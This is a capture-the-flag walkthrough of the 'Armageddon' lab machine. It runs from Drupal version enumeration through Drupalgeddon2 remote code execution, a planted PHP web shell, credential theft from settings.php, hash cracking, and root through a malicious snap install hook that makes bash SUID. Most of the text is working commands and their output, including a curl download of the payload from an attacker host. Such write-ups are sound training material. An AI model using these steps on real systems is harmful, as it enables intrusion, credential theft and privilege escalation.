# Armageddon
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User/Access | Technique Used | Result |
| :--- | :--- | :--- | :--- |
| **1. Initial Enumeration** | (Web) | Nmap scan & `CHANGELOG.txt` discovery | Identified an Apache web server running **Drupal 7.56**, a version known to be vulnerable. |
| **2. Foothold** | (apache) | 'Drupalgeddon2' Remote Code Execution (RCE) | Exploited the known RCE vulnerability in Drupal to gain an initial shell as the `apache` user. |
| **3. User** | (brucetherealadmin) | Database Credential Theft & Hash Cracking | Found database credentials in `/var/www/html/sites/default/settings.php`. Used these credentials to connect to the MySQL database and retrieve a hashed password for `brucetherealadmin`. The hash was cracked using John the Ripper. |
| **4. SSH Access** | (brucetherealadmin) | Password Reuse | Used the cracked password to log in to the machine via SSH as the `brucetherealadmin` user. |
| **5. Privilege Escalation** | (root) | Sudo Misconfiguration (`snap install`) | Identified a `sudo` misconfiguration allowing `brucetherealadmin` to run `snap install` as root without a password. Created a malicious snap package to give a local copy of `bash` the SUID bit, granting root privileges. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```bash
Nmap scan report for 10.10.10.233
Host is up (0.046s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to  Armageddon |  Armageddon
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
```
As we can see from the http server banner this machine is running CentOS and is explsing only two services: ssh and http.
As we can see from the nmap results, this site is running Drupal 7, a CMS which is notoriously known for being vulnerable.  
As we can notice, this site is also exposing a `robots.txt` file that is disallowing 36 entries.  
As we can see the `robots.txt` file contains a disallowed entry also for `CHANGELOG.txt` if we open this file we can enumerate the exact version of Drupal:  
```
Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues (access bypass). See SA-CORE-2017-003.

Drupal 7.55, 2017-06-07
-----------------------
```
Once we have the exact version, we can enumerate the exploits for this software by using `searchsploit`
```bash
[root@kali walkthroughs ]$ searchsploit drupal                    
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 4.0 - News Message HTML Injection                                                                                                                                                                   | php/webapps/21863.txt
Drupal 4.1/4.2 - Cross-Site Scripting                                                                                                                                                                      | php/webapps/22940.txt
Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                                                                                                                                                              | php/webapps/1088.pl
Drupal < 4.7.6 - Post Comments Remote Command Execution                                                                                                                                                    | php/webapps/3313.pl
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                                                                                                                                                | php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                                                                                                                                                              | php/webapps/27020.txt
Drupal < 5.1 - Post Comments Remote Command Execution                                                                                                                                                      | php/webapps/3312.pl
Drupal 5.21/6.16 - Denial of Service                                                                                                                                                                       | php/dos/10826.sh
Drupal < 5.22/6.16 - Multiple Vulnerabilities                                                                                                                                                              | php/webapps/33706.txt
Drupal 5.2 - PHP Zend Hash ation Vector                                                                                                                                                                    | php/webapps/4510.txt
Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                                                                                                     | php/webapps/11060.txt
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                                                                                                          | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                                                                                                           | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                                                                                                                | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                                                                                                                | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                                                                                                   | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                                                                                                                                     | php/webapps/18564.txt
Drupal < 7.34 - Denial of Service                                                                                                                                                                          | php/dos/35415.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                                                                        | php/webapps/44449.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                                                                | php/webapps/44542.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                                                                   | php/webapps/44557.rb
Drupal 7.x Module Services - Remote Code Execution                                                                                                                                                         | php/webapps/41564.php
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                                                    | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                                                                           | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                                                                      | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                                                                             | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                                                                         | php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                                                                          | php/webapps/44501.txt
Drupal avatar_uploader v7.x-1.0-beta8 - Cross Site Scripting (XSS)                                                                                                                                         | php/webapps/50841.txt
Drupal Module Ajax Checklist 5.x-1.0 - Multiple SQL Injections                                                                                                                                             | php/webapps/32415.txt
Drupal Module CAPTCHA - Security Bypass                                                                                                                                                                    | php/webapps/35335.html
Drupal Module CKEditor 3.0 < 3.6.2 - Persistent EventHandler Cross-Site Scripting                                                                                                                          | php/webapps/18389.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                                                                                     | php/webapps/25493.txt
Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)                                                                                                                                            | php/webapps/40149.rb
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                                                                              | php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting                                                                                                                                    | php/webapps/35397.txt
Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload                                                                                                                             | php/webapps/37453.php
Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Multiple Vulnerabilities                                                                                               | php/webapps/35072.txt
Drupal Module MiniorangeSAML 8.x-2.22 - Privilege escalation                                                                                                                                               | php/webapps/50361.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                                                                          | php/remote/40130.rb
Drupal Module Sections 5.x-1.2/6.x-1.2 - HTML Injection                                                                                                                                                    | php/webapps/33410.txt
Drupal Module Sections - Cross-Site Scripting                                                                                                                                                              | php/webapps/10485.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
## Foothold 
As we can see we have many available exploit, however, the one that looks more dangerous (and does not require authentication) is `Drupalgeddon2`, we have three different version of this exploit available:  
```bash
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                                                                        | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                                                    | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                                                                           | php/webapps/44448.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
However, even if we tend to prefer the python versions, this time the ruby exploit seems to include the drupal version we are running (python: `Drupal < 8.3.9 / < 8.4.6 / < 8.5.1` ruby: `Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1`). So now let's mirror the ruby exploit.
As we can notice from a first run, we need to install the following gem to continue:  
```bash
[root@kali exploits ]$ ruby 44449.rb                    
<internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require': cannot load such file -- highline/import (LoadError)
        from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require'
        from 44449.rb:16:in `<main>'
[root@kali exploits ]$ gem install highline                          
Fetching highline-2.0.3.gem
Successfully installed highline-2.0.3
Parsing documentation for highline-2.0.3
Installing ri documentation for highline-2.0.3
Done installing documentation for highline after 2 seconds
1 gem installed
```
Once we have this gem installed we can run the exploit and gain a shell:
```bash
[root@kali exploits ]$ ruby 44449.rb                
Usage: ruby drupalggedon2.rb <target> [--authentication] [--verbose]
Example for target that does not require authentication:
       ruby drupalgeddon2.rb https://example.com
Example for target that does require authentication:
       ruby drupalgeddon2.rb https://example.com --authentication
[root@kali exploits ]$ ruby 44449.rb http://10.10.10.233
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.233/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo KJEXSXME
[+] Result : KJEXSXME
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.233/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
armageddon.htb>> id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
armageddon.htb>> 
```
unfortunately we cannot spawn a shell with a full tty because this box is giving some io device error.
## User
Once we are logged in we can poke around into drupal configuration files to see if we can discover some database credentials.  
Looking at google, we can see that drupal stores db credentials in `/var/www/html/sites/default/settings.php` .  
Into this file we can find the following definition:
```php
$databases = array (                                                                                                  
  'default' =>                                                                                                        
  array (                                                                                                             
    'default' =>                                                                                                      
    array (                                                                                                           
      'database' => 'drupal',                                                                                         
      'username' => 'drupaluser',                                                                                     
      'password' => 'CQHEy@9M*m23gBVj',                                                                               
      'host' => 'localhost',                                                                                          
      'port' => '',                                                                                                   
      'driver' => 'mysql',                                                                                            
      'prefix' => '',                                                                                                 
    ),                                                                                                                
  ),                                                                                                                  
);      
```
Now we can try to log in into mysql db. The problem is that since we do not have a fully working tty we cannot get any mysql prompt.  
We need to try to execute queries using a one liner command:  
```bash
armageddon.htb>> mysql -u drupaluser --password='CQHEy@9M*m23gBVj' -e 'show databases;'                                  
Database
information_schema
drupal
mysql
performance_schema
armageddon.htb>> mysql -D drupal -u drupaluser --password='CQHEy@9M*m23gBVj' -e 'show tables';
[... SNIP ...]
users
[... SNIP ...]
armageddon.htb>> mysql -D drupal -u drupaluser --password='CQHEy@9M*m23gBVj' -e 'describe users';
Field   Type    Null    Key     Default Extra
uid     int(10) unsigned        NO      PRI     0
name    varchar(60)     NO      UNI
pass    varchar(128)    NO
mail    varchar(254)    YES     MUL
theme   varchar(255)    NO
signature       varchar(255)    NO
signature_format        varchar(255)    YES             NULL
created int(11) NO      MUL     0
access  int(11) NO      MUL     0
login   int(11) NO              0
status  tinyint(4)      NO              0
timezone        varchar(32)     YES             NULL
language        varchar(12)     NO
picture int(11) NO      MUL     0
init    varchar(254)    YES
data    longblob        YES             NULL
armageddon.htb>> mysql -D drupal -u drupaluser --password='CQHEy@9M*m23gBVj' -e 'SELECT name,mail,pass FROM users';
name    mail    pass

brucetherealadmin       admin@armageddon.eu     $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```
As we can see we managed to gather `brucetherealadmin` password hash.  
Now we can try to crack this hash using `john`:
```bash
[root@kali Armageddon ]$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                                                
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)     
1g 0:00:00:00 DONE (2022-06-23 10:25) 5.263g/s 1263p/s 1263c/s 1263C/s tiffany..chris
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Now, for the sake of knowledge we let's check what king of hash `$S$` is.  
```
Hash mode #7900                                                                                                                                                                                                                                Name................: Drupal7                                                                                                                                                                                                                Category............: Forums, CMS, E-Commerce                                                                                                                                                                                                Slow.Hash...........: Yes                                                                                                                                                                                                                    Password.Len.Min....: 0                                                                                                                                                                                                                    
  Password.Len.Max....: 256                                                                                                                                                                                                                  
  Salt.Type...........: Embedded                                                                                                                                                                                                             
  Salt.Len.Min........: 0                                  
  Salt.Len.Max........: 256                                                                                           
  Kernel.Type(s)......: pure                                                                                                                                                                                                                 
  Example.Hash.Format.: plain                                                                                         
  Example.Hash........: $S$C20340258nzjDWpoQthrdNTR02f0pmev0K/5/Nx80WSkOQcPEQRh
  Example.Pass........: hashcat                            
  Benchmark.Mask......: ?b?b?b?b?b?b?b
```
as we can see this is a Drupal7 hash type.  
Now with the password we can try to login via ssh as user `brucetherealadmin`.
```bash
[root@kali wordlists ]$ ssh -l brucetherealadmin $TARGET
The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
ED25519 key fingerprint is SHA256:rMsnEyZLB6x3S3t/2SFrEG1MnMxicQ0sVs9pFhjchIQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.233' (ED25519) to the list of known hosts.
brucetherealadmin@10.10.10.233's password: 
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
[brucetherealadmin@armageddon ~]$ 
```

## Root
Once we log in, if we run `sudo -l` we can see the following:  
```
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```
Now we can see [GTFOBins for snap](https://gtfobins.github.io/gtfobins/snap/#sudo)we need to generate one package to trigger command execution as root.  
As we discovered reverse shell execution doesn't work and we cannot edit anything under `/usr/bin` because this path is included into the snamp environment.  
So we can make a copy of bash in our home directory and generate the snap package containing the following payload:  
```bash
root@kali www ]$ COMMAND='chown root:root /home/brucetherealadmin/bash; chmod 4755 /home/brucetherealadmin/bash'
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta

Created package {:path=>"xxxx_1.0_all.snap"}
```
Now we can upload the package and install it via `sudo`
```bash
[brucetherealadmin@armageddon ~]$ curl -o suid.snap  http://10.10.14.19/xxxx_1.0_all.snap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4096  100  4096    0     0  46748      0 --:--:-- --:--:-- --:--:-- 47627
[brucetherealadmin@armageddon ~]$ sudo snap install suid.snap --dangerous --devmode      
error: cannot perform the following tasks:
- Run install hook of "xxxx" snap if present (run hook "install": exit status 1)
[brucetherealadmin@armageddon ~]$ ls -la bash 
-rwsr-xr-x. 1 root root 964536 Jun 23 09:48 bash
[brucetherealadmin@armageddon ~]$ ./bash -p
bash-4.2# id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) euid=0(root) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
bash-4.2# 
```
as we can see the effective uid is set to 0 (root), hence we owned root on this box.

